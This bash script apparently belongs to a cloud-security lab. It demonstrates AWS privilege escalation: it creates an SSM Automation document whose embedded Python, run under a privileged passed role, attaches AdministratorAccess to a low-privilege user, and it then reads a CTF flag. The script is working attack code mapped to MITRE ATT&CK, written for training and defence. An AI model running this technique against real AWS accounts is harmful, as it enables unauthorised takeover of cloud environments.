#!/bin/bash
set -e

# Demo script for ssm:CreateDocument + ssm:StartAutomationExecution privilege escalation
# This scenario demonstrates how a user with iam:PassRole, ssm:CreateDocument, and
# ssm:StartAutomationExecution can create a malicious SSM Automation document whose
# aws:executeScript step runs under a privileged AutomationAssumeRole, attaching
# AdministratorAccess to the starting user.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ssm-003-to-admin-starting-user"
SSM_DOC_NAME="pl-ssm-003-escalation-doc"
FLAG_PARAM_NAME="/pathfinding-labs/flags/ssm-003-to-admin"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SSM CreateDocument + StartAutomationExecution Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ssm_003_ssm_createdocument_ssm_startautomationexecution.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
AUTOMATION_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.automation_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$AUTOMATION_ROLE_ARN" == "null" ] || [ -z "$AUTOMATION_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract automation role ARN from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Starting user name: $STARTING_USER_NAME"
echo "Automation role ARN: $AUTOMATION_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Wait for IAM propagation — credentials are new and may not be accepted immediately
echo -e "${YELLOW}Waiting 15 seconds for IAM credential propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM propagation complete${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Prove the starting user cannot read the flag yet
echo -e "${YELLOW}Step 4: Confirming starting user cannot read the CTF flag (no admin access yet)${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to read the flag parameter (should fail with AccessDenied)..."
show_cmd "Attacker" "aws ssm get-parameter --name $FLAG_PARAM_NAME --with-decryption --region $AWS_REGION"
PROVE_CANT_OUTPUT=$(aws ssm get-parameter \
    --name "$FLAG_PARAM_NAME" \
    --with-decryption \
    --region "$AWS_REGION" 2>&1 || true)
echo "$PROVE_CANT_OUTPUT"

if echo "$PROVE_CANT_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Confirmed: Starting user correctly denied — cannot read flag${NC}"
else
    echo -e "${RED}⚠ Starting user read the flag without escalating — check IAM policy${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 5: Create the malicious SSM Automation document
echo -e "${YELLOW}Step 5: Creating malicious SSM Automation document${NC}"
echo "The document contains an aws:executeScript step that runs under the"
echo "AutomationAssumeRole (the privileged role) and calls iam:AttachUserPolicy"
echo "to attach AdministratorAccess to the starting user."
echo ""
echo "Admin role (AutomationAssumeRole): $AUTOMATION_ROLE_ARN"
echo "Target user: $STARTING_USER_NAME"
echo ""

# Write the SSM Automation document to a temp file
DOC_FILE=$(mktemp /tmp/ssm-003-doc-XXXXXX.json)
cat > "$DOC_FILE" << 'DOCEOF'
{
  "schemaVersion": "0.3",
  "description": "ssm-003: escalate IAM user via aws:executeScript under AutomationAssumeRole",
  "assumeRole": "{{ AutomationAssumeRole }}",
  "parameters": {
    "AutomationAssumeRole": {
      "type": "String",
      "description": "IAM role ARN for Automation to assume"
    },
    "UserName": {
      "type": "String",
      "description": "IAM user name to escalate"
    }
  },
  "mainSteps": [
    {
      "name": "escalateUser",
      "action": "aws:executeScript",
      "inputs": {
        "Runtime": "python3.11",
        "Handler": "script_handler",
        "InputPayload": {
          "UserName": "{{ UserName }}"
        },
        "Script": "import boto3\n\ndef script_handler(events, context):\n    user_name = events['UserName']\n    iam = boto3.client('iam')\n    iam.attach_user_policy(\n        UserName=user_name,\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return {'Status': 'Escalated ' + user_name}\n"
      }
    }
  ]
}
DOCEOF

echo "Document content:"
cat "$DOC_FILE"
echo ""

show_attack_cmd "Attacker" "aws ssm create-document --name $SSM_DOC_NAME --content file://<doc_file> --document-type Automation --document-format JSON --region $AWS_REGION"
CREATE_OUTPUT=$(aws ssm create-document \
    --name "$SSM_DOC_NAME" \
    --content "file://$DOC_FILE" \
    --document-type Automation \
    --document-format JSON \
    --region "$AWS_REGION" 2>&1)

rm -f "$DOC_FILE"

if ! echo "$CREATE_OUTPUT" | grep -q '"Name"\|"DocumentDescription"'; then
    echo -e "${RED}Error: ssm:CreateDocument failed${NC}"
    echo "$CREATE_OUTPUT"
    exit 1
fi

echo -e "${GREEN}✓ SSM Automation document created: $SSM_DOC_NAME${NC}\n"

# [EXPLOIT] Step 6: Start automation execution passing the privileged role as AutomationAssumeRole
echo -e "${YELLOW}Step 6: Starting automation execution (iam:PassRole + ssm:StartAutomationExecution)${NC}"
echo "Passing $AUTOMATION_ROLE_ARN as AutomationAssumeRole so SSM runs"
echo "the Python script under the admin role's credentials."
echo ""

PARAMS_JSON="{\"AutomationAssumeRole\":[\"${AUTOMATION_ROLE_ARN}\"],\"UserName\":[\"${STARTING_USER_NAME}\"]}"

show_attack_cmd "Attacker" "aws ssm start-automation-execution --document-name $SSM_DOC_NAME --parameters '{\"AutomationAssumeRole\":[\"$AUTOMATION_ROLE_ARN\"],\"UserName\":[\"$STARTING_USER_NAME\"]}' --region $AWS_REGION"
START_OUTPUT=$(aws ssm start-automation-execution \
    --document-name "$SSM_DOC_NAME" \
    --parameters "$PARAMS_JSON" \
    --region "$AWS_REGION" 2>&1)

EXECUTION_ID=$(echo "$START_OUTPUT" | jq -r '.AutomationExecutionId // empty' 2>/dev/null)
if [ -z "$EXECUTION_ID" ]; then
    echo -e "${RED}Error: ssm:StartAutomationExecution did not return an AutomationExecutionId${NC}"
    echo "$START_OUTPUT"
    exit 1
fi

echo "Automation execution ID: $EXECUTION_ID"
echo -e "${GREEN}✓ Automation execution started${NC}\n"

# [OBSERVATION] Step 7: Poll for execution completion
# Use readonly credentials for the polling loop — ssm:GetAutomationExecution is an
# observation step, not an exploit step, so we do not need starting user credentials here.
echo -e "${YELLOW}Step 7: Polling for automation execution completion (max 90s)${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Polling every 5 seconds, up to 18 attempts..."
echo ""

EXEC_STATUS=""

for attempt in $(seq 1 18); do
    sleep 5
    show_cmd "ReadOnly" "aws ssm get-automation-execution --automation-execution-id $EXECUTION_ID --region $AWS_REGION --query 'AutomationExecution.AutomationExecutionStatus' --output text"
    EXEC_STATUS=$(aws ssm get-automation-execution \
        --automation-execution-id "$EXECUTION_ID" \
        --region "$AWS_REGION" \
        --query 'AutomationExecution.AutomationExecutionStatus' \
        --output text 2>/dev/null || echo "UNKNOWN")
    echo "  poll $attempt/18: status=$EXEC_STATUS"
    if [ "$EXEC_STATUS" != "Pending" ] && [ "$EXEC_STATUS" != "InProgress" ] && [ "$EXEC_STATUS" != "UNKNOWN" ]; then
        break
    fi
done

if [ "$EXEC_STATUS" = "Success" ]; then
    echo -e "${GREEN}✓ Automation execution succeeded${NC}\n"
else
    echo -e "${RED}Error: Automation execution ended with status '$EXEC_STATUS'${NC}"
    exit 1
fi

# Wait for IAM policy propagation after the attachment
echo -e "${YELLOW}Waiting 15 seconds for IAM policy propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy propagated${NC}\n"

# [EXPLOIT] Step 8: Verify administrator access using the starting user's now-elevated credentials
echo -e "${YELLOW}Step 8: Verifying administrator access${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "The automation attached AdministratorAccess to $STARTING_USER_NAME."
echo "Attempting to list IAM users to confirm admin access..."
echo ""

show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Capture the CTF flag
# The starting user now carries AdministratorAccess, which grants ssm:GetParameter.
# Use the same starting-user credentials already in the environment — no credential switch.
echo -e "${YELLOW}Step 9: Capturing CTF flag from SSM Parameter Store${NC}"
echo "Reading flag with starting-user credentials (now carrying AdministratorAccess)..."
echo ""

show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --with-decryption --query 'Parameter.Value' --output text --region $AWS_REGION"

FLAG_VALUE=""
for attempt in 1 2 3 4 5; do
    FLAG_VALUE=$(aws ssm get-parameter \
        --name "$FLAG_PARAM_NAME" \
        --with-decryption \
        --query 'Parameter.Value' \
        --output text \
        --region "$AWS_REGION" 2>/dev/null || true)
    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
        break
    fi
    echo -e "${YELLOW}Attempt $attempt: flag not yet readable — sleeping 15s for propagation...${NC}"
    sleep 15
done

if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "None" ]; then
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole + ssm:CreateDocument + ssm:StartAutomationExecution)"
echo "2. Created SSM Automation document: $SSM_DOC_NAME"
echo "   - Document contains aws:executeScript step with embedded Python"
echo "3. Started automation execution, passing $AUTOMATION_ROLE_ARN as AutomationAssumeRole"
echo "   - SSM assumed the privileged role and ran the Python script"
echo "   - Python called iam:AttachUserPolicy to attach AdministratorAccess to starting user"
echo "4. Polled for execution completion (succeeded)"
echo "5. Starting user now carries AdministratorAccess — admin access achieved"
echo "6. Captured CTF flag: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (iam:PassRole + ssm:CreateDocument + ssm:StartAutomationExecution)"
echo -e "  → SSM Automation runs Python under $AUTOMATION_ROLE_ARN"
echo -e "  → (iam:AttachUserPolicy) → AdministratorAccess on starting user"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- SSM Automation document: $SSM_DOC_NAME"
echo "- AdministratorAccess policy attached to: $STARTING_USER_NAME"
echo "- Automation execution: $EXECUTION_ID"

echo -e "\n${BLUE}MITRE ATT&CK Techniques:${NC}"
echo "- T1098.003: Account Manipulation: Additional Cloud Roles"
echo "- T1648: Serverless Execution (SSM Automation)"

echo -e "\n${RED}⚠ Warning: AdministratorAccess is still attached to $STARTING_USER_NAME${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
